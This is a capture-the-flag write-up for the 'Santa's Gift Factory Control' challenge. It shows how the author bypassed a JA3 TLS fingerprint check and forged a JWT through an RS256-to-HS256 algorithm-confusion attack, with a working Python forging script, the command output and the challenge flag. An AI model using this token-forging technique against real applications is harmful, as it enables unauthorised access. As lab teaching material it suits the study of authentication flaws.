# HV20.17 Santa's Gift Factory Control

For this challenge, we get a link to a [website](https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/) that is protected using a [JA3 signature](https://github.com/salesforce/ja3). We also know that the signature has to match `771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0` for us to be able to access the site. As this signature is derived from a couple of system / browser parameters (supported ciphers, TLS versions, ...), it is not straightforward to fake it but after googling for a bit, I found a useful [tool](https://github.com/CUCyber/ja3transport) written in go that allows us to bypass the protection.

By using this tool, I was able to access the content of the site, but instead of a flag I got presented with another login form:

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Santa's Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="static/bootstrap/bootstrap.min.css"
      rel="stylesheet"
      media="screen"
    />
    <link
      href="static/fontawesome/css/all.min.css"
      rel="stylesheet"
      media="screen"
    />
    <link href="static/style.css" rel="stylesheet" media="screen" />
  </head>
  <body>
    <div class="login">
      <h1>Login</h1>
      <form action="/login" method="post">
        <label for="username">
          <i class="fas fa-user"></i>
        </label>
        <input
          type="text"
          name="username"
          placeholder="Username"
          id="username"
        />
        <label for="password">
          <i class="fas fa-lock"></i>
        </label>
        <input
          type="password"
          name="password"
          placeholder="Password"
          id="password"
        />

        <input type="submit" value="Login" />
      </form>
    </div>
  </body>
</html>
```

As we don't know any credentials, I adapted my script to try some obvious combinations, as well as SQL Injection attacks. Nothing of them really worked, but when using `admin` as the username I got back a different response including an obscure HTML comment (`<!--DevNotice: User santa seems broken. Temporarily use santa1337.-->`) and a session cookie with a JWT (`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii9rZXlzLzFkMjFhOWY5NDUifQ.eyJleHAiOjE2MDgyMjEyMzAsImlhdCI6MTYwODIxNzYzMCwic3ViIjoibm9uZSJ9.PgZN4Lj52AwevSMKPWeTWFwe3QsGtm-oNp-UR0mGZRtrg59Kul9YoK_-Ufm6DcGIS_6mHQ-GXvl-UXdVxFca2u_yAqhL9FdUJhu-DXZ7RrWkTkoQ_45OJMREuWbbGOaMZ7AwzsGl49B7e4TkmL57J0Vtye32tRLmhpD-dEsQocAG--Bafv10z3ZuprXfjNJWTrghknxEPqZ-fEOdpVDQybev_31F9qHz7SrJxAzyFrbjEtbN4FBF3zEuaqqmHwim2g0XuZh_kHJ3prDB2FySfwmKusL4LiIYQKZ-oHWTQR9_cFPoeKURH82Huvk6jODbTqO-KP4MDEPEkLf8lZyZSA`).

This seems like an important hint. Firstly, we found out that the username should be `santa1337`. Moreover, we learned that the site is using JWT based authentication, which brings along a couple of new attack vectors. My first guess was an attack where we could change the `alg` attribute in the JWT header to `none` and strip the signature. Using this approach, we could force a JWT with the `sub` attribute set to `santa1337` and bypass the login, but unfortunately it did not work.

After a while, I remembered another type of attack where we could trick serveers by changing the JWT type from an assymtric RSA signature (`RS256`) to a symmetric one (`HS256`) and sign the forced JWT with the public key of the server. If the application is vulnerable, it would verify the signature using it's private key and accept the forged token. Thankfully, we have access to the public key of the server, as it's path was specified in the JWT we already have (`/keys/1d21a9f945`). Using this path and our go program, we can download the [public key](./public_key.pem).

Now we have everything we need to create a forged JWT token that uses the `HS256` algorithm and gets signed with the public key from the application. For this purpose, I wrote another small [python script](./forge-jwt.py) (of course we need to make sure that the token is not expired before running the script):

```python
#!/usr/bin/env python3
import jwt

public = open('public_key.pem', 'r').read()
token = jwt.encode({
    "exp": 1608218097,
    "iat": 1608214497,
    "sub": "santa1337"
    }, key=public, algorithm='HS256', headers={'kid': '/keys/1d21a9f945'}).decode('ascii')

print(token)
```

Now we can take the ouput of this script and try to send it as the `session` cookie from within our go program. Using this approach, I was able to bypass both protection mechanisms and access Santas secret control panel, where I could get the flag (hidden inside an HTML comment):

```bash
➜  17 git:(main) ✗ go run crack.go $(./forge-jwt.py) | grep HV20
<!--Congratulations, here's your flag: HV20{ja3_h45h_1mp3r50n4710n_15_fun}-->
```

**Flag:** HV20{ja3_h45h_1mp3r50n4710n_15_fun}
